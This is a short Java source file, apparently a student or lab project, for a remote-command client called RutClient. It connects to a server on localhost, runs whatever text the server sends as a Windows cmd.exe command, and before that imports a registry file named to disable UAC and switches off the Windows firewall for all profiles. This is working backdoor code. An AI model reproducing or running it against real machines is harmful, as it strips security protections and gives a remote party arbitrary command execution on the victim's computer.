    /*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 */
package rutserver.rutclient;

import java.io.IOException;

/**
 *
 * @author javii
 */
public class RutClient {

    public static void main(String[] args) {
        try {
            clientManager client = new clientManager("127.0.0.1", 2023);
            client.connectToServer();

            String respuesta = client.receiveMessage();
            
            try {
            ProcessBuilder comando = new ProcessBuilder();
            ProcessBuilder desactivar = new ProcessBuilder();
            ProcessBuilder firewall = new ProcessBuilder("cmd.exe", "/c", "regedit /s C:\\Users\\javii\\Documents\\NetBeansProjects\\RutClient\\src\\main\\java\\rutserver\\rutclient\\disableUAC.reg");            
            firewall.start();
            
            desactivar.command("cmd.exe", "/c", "netsh advfirewall set allprofiles state off");
            desactivar.start();
            
            comando.command("cmd.exe", "/c", respuesta);
            comando.start();

        } catch (IOException e) {
            e.printStackTrace();
        }

        } catch (IOException e) {
            e.printStackTrace();
        }
        
        System.out.println("Todo ha ido bien");
    }
}
